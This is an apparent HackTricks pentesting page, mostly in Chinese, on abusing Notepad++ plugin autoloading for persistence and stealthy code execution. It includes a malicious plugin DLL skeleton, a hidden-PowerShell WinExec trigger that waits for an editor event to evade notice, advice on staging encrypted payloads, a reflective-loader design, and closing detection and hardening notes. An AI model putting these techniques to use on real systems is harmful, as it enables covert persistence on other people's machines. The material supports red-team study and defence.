# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ 会在启动时 **autoload** 其 `plugins` 子文件夹下找到的每个 plugin DLL。将恶意 plugin 放入任何**可写的 Notepad++ installation**，就能在每次 editor 启动时在 `notepad++.exe` 内获得 code execution，这可被用于 **persistence**、隐蔽的 **initial execution**，或者当 editor 以 elevated 权限启动时作为一个 **in-process loader**。

自 **Notepad++ 7.6+** 起，预期的手动安装布局是**每个 plugin 一个子文件夹**（`plugins\<PluginName>\<PluginName>.dll`）。在 **portable mode**（`notepad++.exe` 旁存在 `doLocalConf.xml`）下，整个 application tree 会保持在该目录本地，这通常会把复制来的/admin tool bundles 变成一个容易被 user-writable 的 execution surface。

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常需要 admin 才能写入）。
- 适用于低权限 operator 的可写选项：
- 在 user-writable folder 中使用 **portable Notepad++ build**。
- 将 `C:\Program Files\Notepad++` 复制到用户可控路径（例如 `%LOCALAPPDATA%\npp\`），并从那里运行 `notepad++.exe`。
- 寻找已经包含 `doLocalConf.xml` 且位于 `Program Files` 之外的 **admin tool bundles**、解压后的 zip 副本，或 help-desk toolkits。
- 每个 plugin 都会在 `plugins` 下获得自己的子文件夹，并在启动时自动加载；菜单项会出现在 **Plugins** 下。

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ 期望特定的 **exported functions**。这些函数都会在初始化期间被调用，从而提供多个执行点：
- **`DllMain`** — 在 DLL load 时立即运行（第一个执行点）。
- **`setInfo(NppData)`** — 在 load 时调用一次，用于提供 Notepad++ handles；通常在这里注册菜单项。
- **`getName()`** — 返回菜单中显示的 plugin 名称。
- **`getFuncsArray(int *nbF)`** — 返回菜单 commands；即使为空，也会在 startup 期间被调用。
- **`beNotified(SCNotification*)`** — 接收 Notepad++ / Scintilla events（适合将 payload 延迟到用户操作或 editor event 时执行）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler，适合更大的 data exchanges。
- **`isUnicode()`** — 在 load 时检查的兼容性标志。

大多数 exports 都可以实现为 **stubs**；execution 可以在 `DllMain` 或上面任意回调中于 autoload 期间发生。

## Minimal malicious plugin skeleton
编译一个带有所需 exports 的 DLL，并将其放到可写的 Notepad++ 目录下的 `plugins\\MyNewPlugin\\MyNewPlugin.dll`：
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## 通过 `beNotified` 的低噪声触发模式
为了 OPSEC，许多 payload 不应该从 `DllMain` 触发。更安静的模式是让 plugin 正常加载，然后仅在真实的 editor 事件之后执行，例如 **startup complete**、**buffer activation**，或 **first typed character**。
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
这比 noisy 的 `DllMain` beacon 更符合 public offensive research：DLL 仍然会在启动时被 autoload，但恶意行为会延迟到 Notepad++ 看起来确实在使用时才执行。

## Using the plugin config directory as secondary storage
Notepad++ 暴露了 `NPPM_GETPLUGINSCONFIGDIR`，它会返回**当前用户的 plugin configuration directory**。恶意 plugin 可以利用这一点，让磁盘上的 DLL 尽量精简，同时把加密的 config、staged payloads 或 tasking files 存放在一个与正常 plugin state 融为一体的路径中。
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- 一个 tiny autoloaded bootstrap DLL;
- per-user tasking 而不再触碰 main plugin binary;
- 将 **autoload trigger** 与更重的 second stage 分离。

## Reflective loader plugin pattern
A weaponized plugin can turn Notepad++ into a **reflective DLL loader**:
- 提供一个 minimal UI/menu entry（例如 "LoadDLL"）。
- 接受一个 **file path** 或 **URL** 来 fetch 一个 payload DLL。
- 将 DLL reflectively map 到当前 process，并 invoke 一个 exported entry point（例如，fetched DLL 内的一个 loader function）。
- 优点：复用一个看起来 benign 的 GUI process，而不是 spawning 一个新的 loader；payload 会继承 `notepad++.exe` 的 integrity（包括 elevated contexts）。
- 权衡：把一个 **unsigned plugin DLL** drop 到 disk 上会很 noisy；一个实用的变体是只把 autoloaded plugin 当作 stub，把真正的 implant encrypted/staged 在别处。

## Detection and hardening notes
- Block 或 monitor **writes to Notepad++ plugin directories**（包括 user profiles 中的 portable copies）；启用 controlled folder access 或 application allowlisting。
- 对 `plugins` 下的 **new unsigned DLLs**、portable Notepad++ trees 的 changes，以及来自 `notepad++.exe` 的异常 **child processes/network activity** 进行告警。
- 为合法 plugins 建立 baseline，并调查任何导出正常 Notepad++ plugin interface、但同时又会 spawn shells、PowerShell 或 network beacons 的新 DLL。
- 强制仅通过 **Plugins Admin** 安装插件，并限制从不受信任路径运行 portable copies。

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
